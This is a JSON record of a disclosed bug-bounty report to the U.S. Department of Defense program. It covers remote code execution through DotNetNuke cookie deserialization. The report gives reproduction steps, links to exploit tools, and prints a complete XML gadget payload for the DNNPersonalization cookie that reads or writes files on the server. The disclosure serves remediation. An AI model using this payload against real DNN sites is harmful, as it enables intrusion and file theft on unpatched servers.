{
  "id": 876708,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzY3MDg=",
  "url": "https://hackerone.com/reports/876708",
  "title": "Remote Code Execution through DNN Cookie Deserialization ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-05-17T20:13:54.706Z",
  "submitted_at": "2020-05-17T20:13:54.706Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "droop3r",
    "url": "/droop3r",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-05-27T14:06:11.705Z",
  "bug_reporter_agreed_on_going_public_at": "2020-05-26T15:18:31.636Z",
  "team_member_agreed_on_going_public_at": "2020-05-27T14:06:11.636Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nThe application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write\n\n## Step-by-step Reproduction Instructions\n\n1. Navigate to a random page that must return a 404 Error status like ```https://████/test```\n2. Add this cookie in the request header: ```DNNPersonalization```\n3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:\n\n```\n<profile>\n<item key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n<ExpandedElement/>\n<ProjectedProperty0>\n<MethodName>WriteFile</MethodName>\n<MethodParameters>\n<anyType xsi:type=\"xsd:string\">test</anyType>\n</MethodParameters>\n<ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance>\n</ProjectedProperty0>\n</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>\n</item>\n</profile>\n```\n\nWhere ```test``` is the wanted file\n\nExpected result:\n████\n\n\n## Product, Version, and Configuration (If applicable)\nPlatform: https://████████/shell.aspx\nVulnerable Product: DotNetNuke\nVulnerable Version: < 9.3.0-RC\n\n\n## Suggested Mitigation/Remediation Actions\nUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\n\n## Impact\n\nAn attacker can execute remote commands on the system and gain unauthorized access to it.",
  "weakness": {
    "id": 59,
    "name": "OS Command Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 56,
  "voters": [
    "th3hidd3nmist",
    "nytr0gen",
    "7odamoo",
    "1trick",
    "13370verride",
    "0xelkomy",
    "brahim_boufakri01",
    "droop3r",
    "dastan_9408",
    "h4zuel",
    "and 46 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
